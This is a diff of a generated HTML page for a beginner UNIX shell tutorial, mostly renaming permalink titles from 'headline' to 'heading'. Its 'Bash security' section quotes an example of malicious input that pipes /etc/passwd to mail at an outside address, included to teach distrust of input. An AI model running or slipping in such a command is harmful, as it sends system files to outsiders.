@@ -16,6 +16,7 @@
         <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
         <script src="../_static/jquery.js"></script>
         <script src="../_static/underscore.js"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js"></script>
         <script src="../_static/doctools.js"></script>
         <script src="../_static/panels.js"></script>
         <script crossorigin="anonymous" integrity="sha256-Ae2Vz/4ePdIu6ZyI/5ZGsYnb+m0JlOmKPjt6XZ9JJkA=" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
@@ -482,9 +483,9 @@
 }
 </style>
 <section id="more-about-the-unix-shell">
-<h1>More about the UNIX shell<a class="headerlink" href="#more-about-the-unix-shell" title="Permalink to this headline"></a></h1>
+<h1>More about the UNIX shell<a class="headerlink" href="#more-about-the-unix-shell" title="Permalink to this heading"></a></h1>
 <section id="types-of-shell">
-<h2>Types of shell<a class="headerlink" href="#types-of-shell" title="Permalink to this headline"></a></h2>
+<h2>Types of shell<a class="headerlink" href="#types-of-shell" title="Permalink to this heading"></a></h2>
 <p>Several shells are available, the most common ones being probably <code class="docutils literal notranslate"><span class="pre">bash</span></code> and <code class="docutils literal notranslate"><span class="pre">tcsh</span></code>.
 In this tutorial, we will always refer to the <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!
 To check the type of shell we are using we can type <code class="docutils literal notranslate"><span class="pre">echo</span></code> to display the value of the <code class="docutils literal notranslate"><span class="pre">$0</span></code> environment variable:</p>
@@ -495,7 +496,7 @@ To check the type of shell we are using we can type <code class="docutils litera
 </div>
 </section>
 <section id="manual-pages">
-<h2>Manual pages<a class="headerlink" href="#manual-pages" title="Permalink to this headline"></a></h2>
+<h2>Manual pages<a class="headerlink" href="#manual-pages" title="Permalink to this heading"></a></h2>
 <p>Each command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the <code class="docutils literal notranslate"><span class="pre">man</span></code> command, for example:</p>
 <div class="highlight-man notranslate"><div class="highlight"><pre><span></span>man ls
 </pre></div>
@@ -515,7 +516,7 @@ vdir                 (1)  - list directory contents
 </div>
 </section>
 <section id="environment-variables">
-<h2>Environment variables<a class="headerlink" href="#environment-variables" title="Permalink to this headline"></a></h2>
+<h2>Environment variables<a class="headerlink" href="#environment-variables" title="Permalink to this heading"></a></h2>
 <p>In addition to <code class="docutils literal notranslate"><span class="pre">0</span></code>, some other common examples of environment variables are <code class="docutils literal notranslate"><span class="pre">EDITOR</span></code>, <code class="docutils literal notranslate"><span class="pre">PATH</span></code>, and <code class="docutils literal notranslate"><span class="pre">LD_LIBRARY_PATH</span></code>, whose value can be displayed by</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span>echo $EDITOR
 echo $PATH
@@ -570,7 +571,7 @@ echo $CHARACTER
 <p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min):</span></code> Change the file permissions so that your friends can read, write, and execute (or not) the <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> shell script and try to set their Star Wars character to something you like.</p>
 </section>
 <section id="variables">
-<h2>Variables<a class="headerlink" href="#variables" title="Permalink to this headline"></a></h2>
+<h2>Variables<a class="headerlink" href="#variables" title="Permalink to this heading"></a></h2>
 <p>In <code class="docutils literal notranslate"><span class="pre">bash</span></code>, variables are usually interpreted as strings.
 However, we can do integer arithmetic using the <code class="docutils literal notranslate"><span class="pre">let</span></code> keyword. Let’s add to <code class="docutils literal notranslate"><span class="pre">StarWars.sh</span></code> the following lines:</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span>A=1
@@ -583,7 +584,7 @@ echo &quot;strvar is ${strvar}, intvar is ${intvar}&quot;
 <p>What can you notice?</p>
 </section>
 <section id="differences-among-files">
-<h2>Differences among files<a class="headerlink" href="#differences-among-files" title="Permalink to this headline"></a></h2>
+<h2>Differences among files<a class="headerlink" href="#differences-among-files" title="Permalink to this heading"></a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">diff</span></code> command is used to compare files line by line.
 To simply check for differing files:</p>
 <p><code class="docutils literal notranslate"><span class="pre">diff</span> <span class="pre">-q</span> <span class="pre">file1.dat</span> <span class="pre">file2.dat</span></code></p>
@@ -593,7 +594,7 @@ To simply check for differing files:</p>
 <p><code class="docutils literal notranslate"><span class="pre">diff</span> <span class="pre">-u</span> <span class="pre">file1.dat</span> <span class="pre">file2.dat</span></code></p>
 </section>
 <section id="looping-over-files">
-<h2>Looping over files<a class="headerlink" href="#looping-over-files" title="Permalink to this headline"></a></h2>
+<h2>Looping over files<a class="headerlink" href="#looping-over-files" title="Permalink to this heading"></a></h2>
 <p>In bash, loops have the following syntax:</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span>for VARIABLE in LIST
 do
@@ -611,7 +612,7 @@ done
 <p>if the loop has to be repeated until a condition is fulfilled.</p>
 </section>
 <section id="conditionals">
-<h2>Conditionals<a class="headerlink" href="#conditionals" title="Permalink to this headline"></a></h2>
+<h2>Conditionals<a class="headerlink" href="#conditionals" title="Permalink to this heading"></a></h2>
 <p>Conditionals have the following syntax:</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span>if [ COND1 ]
 then
@@ -639,7 +640,7 @@ Be careful! We might be tempted to use <code class="docutils literal notranslate
 </ul>
 </section>
 <section id="linking-commands">
-<h2>Linking commands<a class="headerlink" href="#linking-commands" title="Permalink to this headline"></a></h2>
+<h2>Linking commands<a class="headerlink" href="#linking-commands" title="Permalink to this heading"></a></h2>
 <p>Let us consider the three following lines, in which we link the commands to list the files in the <code class="docutils literal notranslate"><span class="pre">Poems</span></code> and <code class="docutils literal notranslate"><span class="pre">Recipes</span></code> folders through the <code class="docutils literal notranslate"><span class="pre">;</span></code>, <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code>, or <code class="docutils literal notranslate"><span class="pre">||</span></code> operators:</p>
 <div class="highlight-none notranslate"><div class="highlight"><pre><span></span>ls Poems/*.txt; ls Recipes/*.txt
 ls Poems/*.txt &amp;&amp; ls Recipes/*.txt
@@ -649,7 +650,7 @@ ls Poems/*.txt || ls Recipes/*.txt
 <p>The <code class="docutils literal notranslate"><span class="pre">;</span></code> means execute the first, then the second; the <code class="docutils literal notranslate"><span class="pre">&amp;&amp;</span></code> means execute the first, then the second if the first was successful, while the <code class="docutils literal notranslate"><span class="pre">||</span></code> means execute the first, then the second if the first was not successful.</p>
 </section>
 <section id="pipes-and-redirection">
-<h2>Pipes and redirection<a class="headerlink" href="#pipes-and-redirection" title="Permalink to this headline"></a></h2>
+<h2>Pipes and redirection<a class="headerlink" href="#pipes-and-redirection" title="Permalink to this heading"></a></h2>
 <p>We already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.</p>
 <p><code class="docutils literal notranslate"><span class="pre">Exercise</span> <span class="pre">(5</span> <span class="pre">min)</span></code>: Save in a file the lines containing the word “force” searching for them in all the files in the <code class="docutils literal notranslate"><span class="pre">Material/StarWars</span></code> folder.</p>
 <p>Solution:</p>
@@ -702,7 +703,7 @@ fi
 <p><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">Poems/*.txt</span> <span class="pre">|</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">ListOfFilesWithTee.dat</span></code></p>
 </section>
 <section id="bash-security">
-<h2>Bash security<a class="headerlink" href="#bash-security" title="Permalink to this headline"></a></h2>
+<h2>Bash security<a class="headerlink" href="#bash-security" title="Permalink to this heading"></a></h2>
 <p><a class="reference external" href="http://i.stack.imgur.com/MI1tR.jpg">Situations that can turn very wrong very quickly</a>, which means it is important to be aware of potentially dangerous behaviours.</p>
 <p>It is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.
 Some examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.</p>
@@ -718,12 +719,12 @@ cat /etc/passwd | mail me@real.com
 <p>Great!</p>
 </section>
 <section id="complexity">
-<h2>Complexity<a class="headerlink" href="#complexity" title="Permalink to this headline"></a></h2>
+<h2>Complexity<a class="headerlink" href="#complexity" title="Permalink to this heading"></a></h2>
 <p>Bash is great until a certain level of complexity is reached…so try to keep it simple!
 What about <a class="reference external" href="http://lhcb-release-area.web.cern.ch/LHCb-release-area/DOC/online/releases/v4r65/doxygen/df/dd9/src_2_lineshape_maker_8cpp__incl.png">this</a>?</p>
 </section>
 <section id="text-viewers">
-<h2>Text viewers<a class="headerlink" href="#text-viewers" title="Permalink to this headline"></a></h2>
+<h2>Text viewers<a class="headerlink" href="#text-viewers" title="Permalink to this heading"></a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">less</span></code> command, which is the improved version of an earlier program, called <code class="docutils literal notranslate"><span class="pre">more</span></code>, is used to read but not edit text files.
 It allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.
 Up and down arrows (or <code class="docutils literal notranslate"><span class="pre">j</span></code> and <code class="docutils literal notranslate"><span class="pre">k</span></code>) allow to scroll through the text file, line by line, while <code class="docutils literal notranslate"><span class="pre">Ctrl+f</span></code> and <code class="docutils literal notranslate"><span class="pre">Ctrl+b</span></code> allow to scroll through the text file, page by page.
@@ -744,7 +745,7 @@ head -n 2 file1.dat file2.dat
 </div>
 </section>
 <section id="text-editors">
-<h2>Text editors<a class="headerlink" href="#text-editors" title="Permalink to this headline"></a></h2>
+<h2>Text editors<a class="headerlink" href="#text-editors" title="Permalink to this heading"></a></h2>
 <p>Text editors allow not only to read, but also to modify the contents of a text file.
 There are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:</p>
 <ul class="simple">
@@ -755,7 +756,7 @@ There are text editors available for every taste, and this is for sure a not-exh
 </ul>
 </section>
 <section id="disk-space">
-<h2>Disk space<a class="headerlink" href="#disk-space" title="Permalink to this headline"></a></h2>
+<h2>Disk space<a class="headerlink" href="#disk-space" title="Permalink to this heading"></a></h2>
 <p>At some point we all need to check how much space we are using.
 For doing that, we can use the <code class="docutils literal notranslate"><span class="pre">df</span></code> and <code class="docutils literal notranslate"><span class="pre">du</span></code> commands.
 The <code class="docutils literal notranslate"><span class="pre">df</span></code> command displays the disk usage and remaining free space on all currently mounted devices:</p>
@@ -786,7 +787,7 @@ Another interesting option is</p>
 <p>which allows to go <code class="docutils literal notranslate"><span class="pre">N</span></code> directories deep.</p>
 </section>
 <section id="over-the-wire-and-bandit-wargame">
-<h2>Over the Wire and Bandit wargame<a class="headerlink" href="#over-the-wire-and-bandit-wargame" title="Permalink to this headline"></a></h2>
+<h2>Over the Wire and Bandit wargame<a class="headerlink" href="#over-the-wire-and-bandit-wargame" title="Permalink to this heading"></a></h2>
 <p>And to conclude…let’s start a 20 min wargame on <a class="reference external" href="http://overthewire.org/wargames/bandit/">Over the Wire</a> and compete to earn a delicious cold beer to be served soon after the session itself!</p>
 <p>Bandit is a wargame aimed at absolute beginners.
 It is organised in levels, each level requiring to having completed the previous one. Don’t panic if you have no clue how to proceed:
